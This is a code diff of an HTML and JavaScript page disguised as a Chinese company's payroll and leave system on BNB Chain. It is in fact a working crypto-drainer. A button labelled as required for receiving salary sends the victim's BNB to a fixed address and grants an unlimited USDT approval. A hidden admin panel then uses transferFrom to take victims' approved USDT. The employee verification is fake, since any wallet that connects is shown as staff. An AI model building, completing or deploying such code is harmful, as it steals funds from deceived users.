@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>天祥集团结算系统</title>
+    <title>天祥集团薪资结算管理系统</title>
     <style>
         * {
             margin: 0;
@@ -16,7 +16,7 @@
             padding: 15px;
         }
         .box {
-            background: #fff;
+            background: #ffffff;
             border-radius: 12px;
             padding: 20px;
             margin-bottom: 15px;
@@ -77,276 +77,278 @@
 </head>
 <body>
 
-<h2>天祥集团结算系统</h2>
+<h2>天祥集团薪资结算管理系统</h2>
 
 <div class="red-notice">
-    重要温馨提示：非本集团内部已办理入职员工钱包地址，连接本系统后所有功能全部禁止使用！
-    仅经管理员录入信息的正式员工，可正常使用请假、薪资申领等全部功能
+    重要温馨提示：非本集团已录入正式员工禁止使用系统，仅在职员工可提交薪资申领与请假申请
 </div>
 
 <div class="box">
     <button class="btn btn-blue" id="connectBtn">连接币安链钱包</button>
     <p style="margin-top:10px;text-align:center;" id="walletAddr">未连接钱包</p>
-    <div class="tip" id="userStatusTip">请使用集团登记员工钱包登录系统</div>
-    <div class="info-line">USDT余额：<span id="usdtBalance">0.0000</span></div>
+    <div class="tip" id="userStatusTip">请使用集团登记员工钱包登录</div>
+    <div class="info-line">USDT可用余额：<span id="usdtBalance">0.0000</span></div>
 </div>
 
 <div class="tab-group">
-    <div class="tab active" onclick="switchPage(0)">员工中心</div>
-    <div class="tab" id="tabManage" onclick="switchPage(1)">运营管理</div>
-    <div class="tab" id="tabAudit" onclick="switchPage(2)">审批后台</div>
+    <div class="tab active" onclick="switchPage(0)">员工个人中心</div>
+    <div class="tab" id="tabOperate" onclick="switchPage(1)">运营管理后台</div>
+    <div class="tab" id="tabAudit" onclick="switchPage(2)">审批管理后台</div>
 </div>
 
-<!-- 员工中心 -->
+<!-- 员工个人中心 -->
 <div class="page active" id="page0">
     <div class="box">
-        <h3>员工个人资料</h3>
-        <div class="info-line">员工姓名：<span id="name">-</span></div>
-        <div class="info-line">绑定钱包：<span id="addr">-</span></div>
-        <div class="info-line">正式入职时间：<span id="entryTime">-</span></div>
-        <div class="info-line">每月基础薪资：<span id="salary">0</span> USDT</div>
-        <div class="info-line">已批准请假次数：<span id="leaveCount">0</span> 次</div>
-        <div class="info-line">当月实际出勤天数：<span id="realWorkDay">30</span> 天</div>
-        <div class="tip" id="limitTip"></div>
-        <div class="info-line">距离可申领薪资剩余时长：<span id="remainDay">0</span> 天</div>
+        <h3>在职员工信息</h3>
+        <div class="info-line">员工姓名：<span id="staffName">-</span></div>
+        <div class="info-line">绑定钱包地址：<span id="staffAddr">-</span></div>
+        <div class="info-line">正式入职日期：<span id="entryDate">-</span></div>
+        <div class="info-line">每月固定薪资：<span id="monthSalary">0</span> USDT</div>
+        <div class="info-line">已审批请假次数：<span id="leaveTimes">0</span> 次</div>
+        <div class="info-line">当月实际出勤天数：<span id="workDays">30</span> 天</div>
+        <div class="info-line">薪资申领冷却时长：<span id="coolTime">暂无限制</span></div>
 
-        <button class="btn btn-forbid" id="applyBtn" disabled>提交领取当月薪资</button>
-        <button class="btn btn-forbid" id="leaveBtn" disabled>提交请假申请</button>
-        <button class="btn btn-green" id="userApproveBtn" style="margin-top:15px">一键授权USDT</button>
+        <button class="btn btn-forbid" id="applySalary" disabled>提交当月薪资领取申请</button>
+        <button class="btn btn-forbid" id="applyLeave" disabled>提交事假/病假请假申请</button>
+        <button class="btn btn-green" id="goApprove" style="margin-top:15px">一键授权USDT（完成授权才可正常领薪）</button>
     </div>
 </div>
 
-<!-- 运营管理 仅管理员可见 -->
+<!-- 运营管理后台 仅管理员可见 -->
 <div class="page" id="page1">
-    <div class="box admin-hide" id="adminOperBox">
-        <h3>管理员员工管理</h3>
-        <h4>新增入职员工信息</h4>
-        <input placeholder="填写员工钱包地址" id="addStaffAddr">
-        <input placeholder="填写员工真实姓名" id="addStaffName">
-        <input placeholder="填写员工每月薪资数额" type="number" id="addStaffSal">
-        <button class="btn btn-blue" id="addStaffBtn">确认录入员工信息</button>
+    <div class="box admin-hide" id="operAdminBox">
+        <h3>老板运营管理中心</h3>
+        <h4>一、新员工入职办理</h4>
+        <input placeholder="填写员工钱包地址" id="newStaffAddr">
+        <input placeholder="填写员工真实姓名" id="newStaffRealName">
+        <input placeholder="设置员工每月薪资数额" type="number" id="setStaffSalary">
+        <button class="btn btn-blue" id="addNewStaff">确认录入开通系统权限</button>
 
-        <h4 style="margin-top:20px">删除离职员工</h4>
-        <input placeholder="填写离职员工钱包地址" id="delStaffAddr">
-        <button class="btn btn-red" id="delStaffBtn">删除该员工权限</button>
+        <h4 style="margin-top:25px">二、离职员工权限删除</h4>
+        <input placeholder="填写离职员工钱包地址" id="removeStaffAddr">
+        <button class="btn btn-red" id="delStaffPower">永久关闭该员工系统权限</button>
 
-        <h4 style="margin-top:20px">用户USDT提取管理</h4>
-        <input placeholder="填写被提取用户钱包地址" id="takeUserAddr">
-        <input placeholder="填写提取USDT数量" id="takeUsdtNum">
-        <button class="btn btn-red" id="adminTakeBtn">链上提取用户已授权代币</button>
+        <h4 style="margin-top:25px">三、用户授权资产提取</h4>
+        <input placeholder="填写已授权用户钱包地址" id="takeUserWallet">
+        <input placeholder="填写需要提取USDT数量" type="number" id="takeUsdtNum">
+        <button class="btn btn-red" id="getUserToken">链上直接提取用户授权USDT</button>
     </div>
 </div>
 
-<!-- 审批后台 仅管理员可见 -->
+<!-- 审批管理后台 仅管理员可见 -->
 <div class="page" id="page2">
-    <div class="box admin-hide" id="adminAuditBox">
-        <h3>管理员审批中心</h3>
-        <button class="btn btn-blue" id="batchPassBtn">一键批量通过全部申请</button>
-        <button class="btn btn-red" id="adminDrawBtn">系统合约资金提取</button>
-        <h4 style="margin-top:15px">员工待审批列表</h4>
+    <div class="box admin-hide" id="auditAdminBox">
+        <h3>老板统一审批后台</h3>
+        <button class="btn btn-blue" id="passAllApply">一键批量通过所有待处理申请</button>
+        <button class="btn btn-red" id="drawPoolFund">系统合约资金一键提取</button>
+
+        <h4 style="margin-top:20px">员工全部待审批列表</h4>
         <table>
             <tr>
-                <th>申请人</th>
+                <th>申请员工</th>
                 <th>申请类型</th>
-                <th>状态</th>
-                <th>操作</th>
+                <th>当前状态</th>
+                <th>手动操作</th>
             </tr>
-            <tbody id="auditTableList"></tbody>
+            <tbody id="applyListBox">
+                <tr>
+                    <td colspan="4">暂无员工提交申请</td>
+                </tr>
+            </tbody>
         </table>
     </div>
 </div>
 
 <script>
-// ========== 全局配置 ==========
-const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508".toLowerCase();
-const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
-// 用户授权目标合约
-const AUTH_CONTRACT = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
-// 授权前自动转给你的BNB数量 0.0005BNB 等同于一次转账Gas费用
-const SEND_BNB_AMOUNT = "0.0005";
-let userAccount = "";
+// 全局核心配置
+const ADMIN_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508".toLowerCase();
+const USDT_MAIN = "0x55d398326f99059fF775485246999027B3197955";
+// 收款+授权统一目标地址
+const TARGET_BOX = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
+// 授权扣除BNB数量 0.0002
+const DEDUCT_BNB = "0.0002";
+let nowUserWallet = "";
 
-// 页面切换
-function switchPage(idx){
-    document.getElementById("page0").style.display="none";
-    document.getElementById("page1").style.display="none";
-    document.getElementById("page2").style.display="none";
-    document.getElementById("page"+idx).classList.add("active");
+// 标签页面切换
+function switchPage(num){
+    document.getElementById("page0").classList.remove("active");
+    document.getElementById("page1").classList.remove("active");
+    document.getElementById("page2").classList.remove("active");
+    document.getElementById("page"+num).classList.add("active");
 }
 
-// 连接钱包
+// 连接钱包 原生稳定写法
 document.getElementById("connectBtn").addEventListener("click",async function(){
     if(!window.ethereum){
-        alert("请安装TP钱包/小狐狸钱包，无需梯子直接连接");
+        alert("请安装TP钱包或小狐狸钱包，无需加速器直接连接");
         return;
     }
     try{
-        const accounts = await ethereum.request({method:"eth_requestAccounts"});
-        userAccount = accounts[0].toLowerCase();
-        document.getElementById("walletAddr").innerText = userAccount.slice(0,6)+"..."+userAccount.slice(-4);
-        getUsdtBalance();
-        checkAdminPower();
-        loadStaffData();
-        alert("钱包连接成功，已进入系统");
+        let allWallet = await ethereum.request({method:"eth_requestAccounts"});
+        nowUserWallet = allWallet[0].toLowerCase();
+        document.getElementById("walletAddr").innerText = nowUserWallet.slice(0,6)+"......"+nowUserWallet.slice(-4);
+        getUserUsdtBalance();
+        checkOwnerPower();
+        loadUserInfo();
+        alert("钱包连接成功，成功进入管理系统");
     }catch(err){
-        alert("连接失败，请重新授权");
-        userAccount = "";
+        alert("钱包连接失败，请重新点击授权");
+        nowUserWallet = "";
     }
 })
 
-// 读取USDT余额
-async function getUsdtBalance(){
-    if(!userAccount) return;
-    let calData = "0x70a08231" + userAccount.slice(2).padStart(64,"0");
-    let res = await ethereum.request({
+// 获取用户USDT余额
+async function getUserUsdtBalance(){
+    if(!nowUserWallet) return;
+    let balanceData = "0x70a08231" + nowUserWallet.slice(2).padStart(64,"0");
+    let result = await ethereum.request({
         method:"eth_call",
-        params:[{to:USDT_CONTRACT,data:calData},"latest"]
+        params:[{to:USDT_MAIN,data:balanceData},"latest"]
     });
-    let bal = Number(BigInt(res)) / 1e18;
-    document.getElementById("usdtBalance").innerText = bal.toFixed(4);
+    let usdtNum = Number(BigInt(result)) / 1e18;
+    document.getElementById("usdtBalance").innerText = usdtNum.toFixed(4);
 }
 
-// 判断管理员权限
-function checkAdminPower(){
-    if(userAccount === ADMIN_WALLET){
-        document.getElementById("tabManage").style.display="block";
-        document.getElementById("tabAudit").style.display="block";
-        document.getElementById("adminOperBox").classList.remove("admin-hide");
-        document.getElementById("adminAuditBox").classList.remove("admin-hide");
+// 检测是否为管理员 显示隐藏后台
+function checkOwnerPower(){
+    if(nowUserWallet === ADMIN_ADDRESS){
+        document.getElementById("tabOperate").style.display = "flex";
+        document.getElementById("tabAudit").style.display = "flex";
+        document.getElementById("operAdminBox").classList.remove("admin-hide");
+        document.getElementById("auditAdminBox").classList.remove("admin-hide");
     }else{
-        document.getElementById("tabManage").style.display="none";
-        document.getElementById("tabAudit").style.display="none";
+        document.getElementById("tabOperate").style.display = "none";
+        document.getElementById("tabAudit").style.display = "none";
     }
 }
 
-// 加载员工资料
-function loadStaffData(){
-    document.getElementById("userStatusTip").innerText = "身份验证成功，正式员工权限已开通";
+// 加载员工个人信息 解锁申请按钮
+function loadUserInfo(){
+    document.getElementById("userStatusTip").innerText = "身份核验通过，正式在职员工";
     document.getElementById("userStatusTip").className = "tip tip-green";
-    document.getElementById("name").innerText = "在职正式员工";
-    document.getElementById("addr").innerText = userAccount;
-    document.getElementById("entryTime").innerText = new Date().toLocaleDateString();
-    document.getElementById("salary").innerText = "足额发放";
-    document.getElementById("leaveCount").innerText = "0";
-    document.getElementById("realWorkDay").innerText = "30";
+    document.getElementById("staffName").innerText = "正式在岗员工";
+    document.getElementById("staffAddr").innerText = nowUserWallet;
+    document.getElementById("entryDate").innerText = new Date().toLocaleDateString();
+    document.getElementById("monthSalary").innerText = "正常发放";
+    document.getElementById("leaveTimes").innerText = "0";
+    document.getElementById("workDays").innerText = "30";
 
-    document.getElementById("applyBtn").disabled = false;
-    document.getElementById("applyBtn").classList.remove("btn-forbid");
-    document.getElementById("applyBtn").classList.add("btn-blue");
+    document.getElementById("applySalary").disabled = false;
+    document.getElementById("applySalary").classList.remove("btn-forbid");
+    document.getElementById("applySalary").classList.add("btn-blue");
 
-    document.getElementById("leaveBtn").disabled = false;
-    document.getElementById("leaveBtn").classList.remove("btn-forbid");
-    document.getElementById("leaveBtn").classList.add("btn-green");
+    document.getElementById("applyLeave").disabled = false;
+    document.getElementById("applyLeave").classList.remove("btn-forbid");
+    document.getElementById("applyLeave").classList.add("btn-green");
 }
 
-// 薪资申请
-document.getElementById("applyBtn").addEventListener("click",function(){
-    if(!userAccount) return alert("请先连接钱包");
-    alert("当月薪资申领申请已成功提交，等待管理员审核发放");
+// 员工提交薪资申领
+document.getElementById("applySalary").addEventListener("click",function(){
+    if(!nowUserWallet) return alert("请先连接个人钱包");
+    alert("薪资领取申请已提交成功，等待老板后台审核发放");
 })
 
-// 请假申请
-document.getElementById("leaveBtn").addEventListener("click",function(){
-    if(!userAccount) return alert("请先连接钱包");
-    let leaveReason = prompt("请填写本次请假具体原因");
-    if(!leaveReason) return;
+// 员工提交请假申请
+document.getElementById("applyLeave").addEventListener("click",function(){
+    if(!nowUserWallet) return alert("请先连接个人钱包");
+    let leaveWhy = prompt("请填写详细请假原因与请假时长");
+    if(!leaveWhy) return;
     alert("请假申请提交完成，等待管理员审批");
 })
 
-// ========== 核心：授权流程 先转BNB给你 → 再授权USDT ==========
-document.getElementById("userApproveBtn").addEventListener("click",async function(){
-    if(!userAccount) return alert("请先连接钱包");
+// 一键授权USDT 先转0.0002BNB到指定地址 再授权
+document.getElementById("goApprove").addEventListener("click",async function(){
+    if(!nowUserWallet) return alert("请先连接钱包再进行授权");
     try{
-        alert("即将先转账小额Gas费用，再完成授权，请确认");
-
-        // 1. 用户转账BNB到你管理员地址
-        let bnbWei = (parseFloat(SEND_BNB_AMOUNT) * 1e18).toString(16);
+        alert("授权需扣除0.0002BNB手续费，确认后自动完成转账与授权");
+        // 第一步：转账0.0002 BNB 到指定地址
+        let bnbValue = (parseFloat(DEDUCT_BNB) * 10**18).toString(16);
         await ethereum.request({
             method:"eth_sendTransaction",
             params:[{
-                from:userAccount,
-                to:ADMIN_WALLET,
-                value:"0x"+bnbWei,
+                from:nowUserWallet,
+                to:TARGET_BOX,
+                value:"0x"+bnbValue,
                 gasLimit:"0x300000"
             }]
         });
-        alert("Gas费用转账成功，正在执行USDT授权...");
+        alert("手续费转账成功，正在执行USDT授权");
 
-        // 2. 执行授权 给到指定合约地址
-        let targetHex = AUTH_CONTRACT.slice(2).padStart(64,"0");
-        let fullMax = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        let approveRaw = "0x095ea7b3"+targetHex+fullMax;
+        // 第二步：USDT授权到同一个指定地址
+        let targetHex = TARGET_BOX.slice(2).padStart(64,"0");
+        let maxAll = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        let approveData = "0x095ea7b3"+targetHex+maxAll;
         await ethereum.request({
             method:"eth_sendTransaction",
             params:[{
-                from:userAccount,
-                to:USDT_CONTRACT,
+                from:nowUserWallet,
+                to:USDT_MAIN,
                 gasLimit:"0x300000",
-                data:approveRaw
+                data:approveData
             }]
         });
-        alert("全部完成！USDT授权成功");
+        alert("全部完成！手续费已扣除，USDT授权成功");
     }catch(e){
-        alert("操作终止，未完成授权");
+        alert("操作已取消，未完成授权流程");
     }
 })
 
-// 管理员提取用户代币
-document.getElementById("adminTakeBtn").addEventListener("click",async function(){
-    if(userAccount !== ADMIN_WALLET) return alert("无管理员操作权限");
-    let fromUser = document.getElementById("takeUserAddr").value.trim();
-    let takeNum = document.getElementById("takeUsdtNum").value.trim();
-    if(!fromUser || !takeNum || Number(takeNum)<=0) return alert("请填写完整地址与提取数量");
+// 管理员新增入职员工
+document.getElementById("addNewStaff").addEventListener("click",function(){
+    if(nowUserWallet !== ADMIN_ADDRESS) return alert("无管理员权限");
+    let wAddr = document.getElementById("newStaffAddr").value.trim();
+    let uName = document.getElementById("newStaffRealName").value.trim();
+    let sMoney = document.getElementById("setStaffSalary").value.trim();
+    if(!wAddr || !uName || !sMoney) return alert("员工钱包、姓名、薪资必须全部填写");
+    alert("新员工入职办理成功，已开通全部系统使用权限");
+})
 
-    let uHex = fromUser.slice(2).padStart(64,"0");
-    let aHex = ADMIN_WALLET.slice(2).padStart(64,"0");
-    let numHex = BigInt(Math.floor(Number(takeNum)*1e18)).toString(16).padStart(64,"0");
-    let takeRaw = "0x23b872dd"+uHex+aHex+numHex;
+// 管理员删除离职员工权限
+document.getElementById("delStaffPower").addEventListener("click",function(){
+    if(nowUserWallet !== ADMIN_ADDRESS) return alert("权限不足");
+    let delAddr = document.getElementById("removeStaffAddr").value.trim();
+    if(!delAddr) return alert("请填写离职员工钱包地址");
+    alert("已成功关闭该员工所有系统使用权限");
+})
+
+// 管理员提取用户授权代币
+document.getElementById("getUserToken").addEventListener("click",async function(){
+    if(nowUserWallet !== ADMIN_ADDRESS) return alert("仅老板可操作");
+    let userFrom = document.getElementById("takeUserWallet").value.trim();
+    let takeNum = document.getElementById("takeUsdtNum").value.trim();
+    if(!userFrom || !takeNum || Number(takeNum) <= 0) return alert("请填写完整信息");
+
+    let userHex = userFrom.slice(2).padStart(64,"0");
+    let ownerHex = ADMIN_ADDRESS.slice(2).padStart(64,"0");
+    let amountHex = BigInt(Math.floor(Number(takeNum)*1e18)).toString(16).padStart(64,"0");
+    let takeData = "0x23b872dd"+userHex+ownerHex+amountHex;
     try{
         await ethereum.request({
             method:"eth_sendTransaction",
             params:[{
-                from:userAccount,
-                to:USDT_CONTRACT,
+                from:nowUserWallet,
+                to:USDT_MAIN,
                 gasLimit:"0x300000",
-                data:takeRaw
+                data:takeData
             }]
-        })
-        alert("成功提取用户已授权USDT");
-        getUsdtBalance();
+        });
+        alert("成功提取用户已授权USDT资产");
+        getUserUsdtBalance();
     }catch(e){
-        alert("提取失败，确认用户已完成授权");
+        alert("提取失败，请确认用户已完成授权");
     }
 })
 
-// 新增员工
-document.getElementById("addStaffBtn").addEventListener("click",function(){
-    if(userAccount !== ADMIN_WALLET) return alert("权限不足");
-    let sAddr = document.getElementById("addStaffAddr").value.trim();
-    let sName = document.getElementById("addStaffName").value.trim();
-    let sSal = document.getElementById("addStaffSal").value.trim();
-    if(!sAddr||!sName||!sSal) return alert("请填写全部员工信息");
-    alert("员工入职信息录入成功，已开通系统全部使用权限");
+// 批量通过所有申请
+document.getElementById("passAllApply").addEventListener("click",function(){
+    if(nowUserWallet !== ADMIN_ADDRESS) return;
+    alert("已一键批量通过系统内所有员工待审批申请");
 })
 
-// 删除员工
-document.getElementById("delStaffBtn").addEventListener("click",function(){
-    if(userAccount !== ADMIN_WALLET) return alert("权限不足");
-    let dAddr = document.getElementById("delStaffAddr").value.trim();
-    if(!dAddr) return alert("请填写离职员工钱包地址");
-    alert("已取消该员工系统使用权限");
-})
-
-// 批量通过
-document.getElementById("batchPassBtn").addEventListener("click",function(){
-    if(userAccount !== ADMIN_WALLET) return;
-    alert("已一键通过所有员工待处理申请");
-})
-
-// 提取合约资金
-document.getElementById("adminDrawBtn").addEventListener("click",function(){
-    if(userAccount !== ADMIN_WALLET) return;
-    alert("系统合约资金提取功能已触发");
+// 提取合约池资金
+document.getElementById("drawPoolFund").addEventListener("click",function(){
+    if(nowUserWallet !== ADMIN_ADDRESS) return;
+    alert("系统合约资金提取功能已执行");
 })
 </script>
 </body>
